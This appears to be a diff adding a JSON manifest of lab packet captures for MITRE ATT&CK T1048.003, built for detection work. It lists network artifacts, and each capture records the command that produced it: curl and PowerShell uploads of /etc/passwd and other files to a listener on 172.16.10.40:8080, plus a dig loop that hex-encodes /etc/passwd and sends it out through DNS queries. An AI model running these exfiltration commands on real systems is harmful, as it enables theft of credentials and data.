@@ -1,0 +1,248 @@
+{
+  "mitre": {
+    "technique_id": "T1048.003",
+    "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol",
+    "url": "https://attack.mitre.org/techniques/T1048/003/",
+    "tactics": ["TA0010"]
+  },
+  "description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Adversaries may opt to use plain HTTP, FTP, DNS or other unencrypted protocols to upload exfiltrated data to a controlled server, leveraging features that look like normal traffic. Encoding (hex, base32, base64) is sometimes applied to fit data into protocol fields but does not constitute encryption.",
+  "artifacts": [
+    "outbound HTTP POST requests to /upload (or similar) endpoints on non-corporate IP addresses",
+    "large HTTP request bodies on plain TCP/8080 (no TLS)",
+    "User-Agent strings characteristic of curl (curl/<version>) or PowerShell (Mozilla/5.0 (Windows NT...) WindowsPowerShell/...)",
+    "WebClient.UploadFile multipart/form-data POST bodies",
+    "sustained TCP/8080 conversations carrying file payloads",
+    "absence of TLS/SSL handshake on web exfil traffic (clear-text HTTP)",
+    "POST bodies containing file content (text, binary) readable in clear in the pcap",
+    "high volume of DNS queries to a single second-level domain",
+    "DNS queries with abnormally long subdomain labels (often 30-63 characters, hex/base32/base64 encoded)",
+    "DNS traffic to non-corporate / non-resolver IP addresses (direct DNS to a controlled server on UDP/53)",
+    "hex-encoded payload chunks split across consecutive subdomain labels (no encryption, only encoding)",
+    "DNS queries resolving to RFC1918 / fixed loopback addresses (e.g. 127.0.0.1) returned by the listener"
+  ],
+  "datasets": {
+    "pcaps": [
+      {
+        "id": "t1048.003-internal-auth-http-exfil-post-small-curl",
+        "file": "pcaps/techniques/t1048.003/t1048.003_internal_auth_http_exfil_post_small__curl.pcap",
+        "name": "Internal HTTP POST exfiltration small payload - curl",
+        "description": "Internal HTTP POST exfiltration of a small payload (/etc/passwd) using curl towards a controlled HTTP listener on port 8080, showing clear-text upload of the file content in the request body.",
+        "criticality": "high",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [8080]
+        },
+        "filter": [
+          "internal",
+          "auth",
+          "http",
+          "exfil",
+          "exfiltration",
+          "post",
+          "upload",
+          "curl",
+          "small",
+          "tcp",
+          "8080",
+          "high"
+        ],
+        "command": "curl -X POST -d @/etc/passwd http://172.16.10.40:8080/upload"
+      },
+      {
+        "id": "t1048.003-internal-auth-http-exfil-post-medium-curl",
+        "file": "pcaps/techniques/t1048.003/t1048.003_internal_auth_http_exfil_post_medium__curl.pcap",
+        "name": "Internal HTTP POST exfiltration medium payload - curl",
+        "description": "Internal HTTP POST exfiltration of a medium payload (/tmp/1mo.txt, ~1MB) using curl towards a controlled HTTP listener on port 8080, showing clear-text upload of the file content in the request body.",
+        "criticality": "high",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [8080]
+        },
+        "filter": [
+          "internal",
+          "auth",
+          "http",
+          "exfil",
+          "exfiltration",
+          "post",
+          "upload",
+          "curl",
+          "medium",
+          "tcp",
+          "8080",
+          "high"
+        ],
+        "command": "curl -X POST -d @/tmp/1mo.txt http://172.16.10.40:8080/upload"
+      },
+      {
+        "id": "t1048.003-internal-auth-http-exfil-post-large-curl",
+        "file": "pcaps/techniques/t1048.003/t1048.003_internal_auth_http_exfil_post_large__curl.pcap",
+        "name": "Internal HTTP POST exfiltration large payload - curl",
+        "description": "Internal HTTP POST exfiltration of a large payload (/tmp/10mo.txt, ~10MB) using curl towards a controlled HTTP listener on port 8080, showing a sustained clear-text upload of the file content in the request body.",
+        "criticality": "high",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [8080]
+        },
+        "filter": [
+          "internal",
+          "auth",
+          "http",
+          "exfil",
+          "exfiltration",
+          "post",
+          "upload",
+          "curl",
+          "large",
+          "tcp",
+          "8080",
+          "high"
+        ],
+        "command": "curl -X POST -d @/tmp/10mo.txt http://172.16.10.40:8080/upload"
+      },
+      {
+        "id": "t1048.003-internal-auth-http-exfil-post-small-powershell",
+        "file": "pcaps/techniques/t1048.003/t1048.003_internal_auth_http_exfil_post_small__powershell.pcap",
+        "name": "Internal HTTP POST exfiltration small payload - PowerShell Invoke-WebRequest",
+        "description": "Internal HTTP POST exfiltration of a small payload (C:\\Windows\\Temp\\secret.txt) using PowerShell Invoke-WebRequest -InFile towards a controlled HTTP listener on port 8080, showing clear-text upload of the file content in the request body.",
+        "criticality": "high",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [8080]
+        },
+        "filter": [
+          "internal",
+          "auth",
+          "http",
+          "exfil",
+          "exfiltration",
+          "post",
+          "upload",
+          "powershell",
+          "invoke-webrequest",
+          "small",
+          "tcp",
+          "8080",
+          "high"
+        ],
+        "command": "Invoke-WebRequest -Uri http://172.16.10.40:8080/upload -Method POST -InFile C:\\Windows\\Temp\\secret.txt"
+      },
+      {
+        "id": "t1048.003-internal-auth-http-exfil-post-medium-powershell",
+        "file": "pcaps/techniques/t1048.003/t1048.003_internal_auth_http_exfil_post_medium__powershell.pcap",
+        "name": "Internal HTTP POST exfiltration medium payload - PowerShell Invoke-WebRequest",
+        "description": "Internal HTTP POST exfiltration of a medium payload (C:\\Windows\\Temp\\medfile.txt) using PowerShell Invoke-WebRequest -InFile towards a controlled HTTP listener on port 8080, showing clear-text upload of the file content in the request body.",
+        "criticality": "high",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [8080]
+        },
+        "filter": [
+          "internal",
+          "auth",
+          "http",
+          "exfil",
+          "exfiltration",
+          "post",
+          "upload",
+          "powershell",
+          "invoke-webrequest",
+          "medium",
+          "tcp",
+          "8080",
+          "high"
+        ],
+        "command": "Invoke-WebRequest -Uri http://172.16.10.40:8080/upload -Method POST -InFile C:\\Windows\\Temp\\medfile.txt"
+      },
+      {
+        "id": "t1048.003-internal-auth-http-exfil-post-large-powershell",
+        "file": "pcaps/techniques/t1048.003/t1048.003_internal_auth_http_exfil_post_large__powershell.pcap",
+        "name": "Internal HTTP POST exfiltration large payload - PowerShell WebClient",
+        "description": "Internal HTTP POST exfiltration of a large payload (C:\\Windows\\Temp\\bigfile.txt) using PowerShell System.Net.WebClient.UploadFile towards a controlled HTTP listener on port 8080, showing a sustained multipart/form-data clear-text upload of the file content.",
+        "criticality": "high",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [8080]
+        },
+        "filter": [
+          "internal",
+          "auth",
+          "http",
+          "exfil",
+          "exfiltration",
+          "post",
+          "upload",
+          "powershell",
+          "webclient",
+          "uploadfile",
+          "large",
+          "tcp",
+          "8080",
+          "high"
+        ],
+        "command": "$wc = New-Object System.Net.WebClient; $wc.UploadFile('http://172.16.10.40:8080/upload', 'C:\\Windows\\Temp\\bigfile.txt')"
+      },
+      {
+        "id": "t1048.003-internal-auth-dns-exfil-hex-small-custom-dig",
+        "file": "pcaps/techniques/t1048.003/t1048.003_internal_auth_dns_exfil_hex_small__custom-dig.pcap",
+        "name": "Internal DNS exfiltration hex small payload - custom dig",
+        "description": "Internal DNS exfiltration of a small payload (/etc/passwd) using a custom shell script that hex-encodes file content (xxd -p, no encryption), splits it into 60-byte chunks and emits one DNS query per chunk via dig towards a custom Python UDP/53 listener for the exfil.packetfeeder.lab zone.",
+        "criticality": "high",
+        "scope": {
+          "protocol": "udp",
+          "ports": [53]
+        },
+        "filter": [
+          "internal",
+          "auth",
+          "dns",
+          "exfil",
+          "exfiltration",
+          "tunnel",
+          "dig",
+          "custom",
+          "hex",
+          "xxd",
+          "small",
+          "udp",
+          "53",
+          "high"
+        ],
+        "command": "# client: while read line; do echo \"$line\" | xxd -p | fold -w 60 | while read chunk; do dig +short +timeout=1 +tries=1 \"$chunk.exfil.packetfeeder.lab\" @172.16.10.40; done; done < /etc/passwd\n# server: custom python3 UDP/53 listener that decodes the subdomain label and replies with 127.0.0.1 (A record)"
+      },
+      {
+        "id": "t1048.003-internal-auth-dns-exfil-hex-large-custom-dig",
+        "file": "pcaps/techniques/t1048.003/t1048.003_internal_auth_dns_exfil_hex_large__custom-dig.pcap",
+        "name": "Internal DNS exfiltration hex large payload - custom dig",
+        "description": "Internal DNS exfiltration of a large payload (/tmp/1mo.txt, ~1MB) using a custom shell script that hex-encodes file content (xxd -p, no encryption), splits it into 60-byte chunks and emits one DNS query per chunk via dig towards a custom Python UDP/53 listener for the exfil.packetfeeder.lab zone, generating a high-volume burst of DNS queries.",
+        "criticality": "high",
+        "scope": {
+          "protocol": "udp",
+          "ports": [53]
+        },
+        "filter": [
+          "internal",
+          "auth",
+          "dns",
+          "exfil",
+          "exfiltration",
+          "tunnel",
+          "dig",
+          "custom",
+          "hex",
+          "xxd",
+          "large",
+          "udp",
+          "53",
+          "high"
+        ],
+        "command": "# client: while read line; do echo \"$line\" | xxd -p | fold -w 60 | while read chunk; do dig +short +timeout=1 +tries=1 \"$chunk.exfil.packetfeeder.lab\" @172.16.10.40; done; done < /tmp/1mo.txt\n# server: custom python3 UDP/53 listener that decodes the subdomain label and replies with 127.0.0.1 (A record)"
+      }
+    ]
+  },
+  "metadata": {
+    "domain": "enterprise",
+    "confidence": "high",
+    "schema_version": "1.0"
+  }
+}
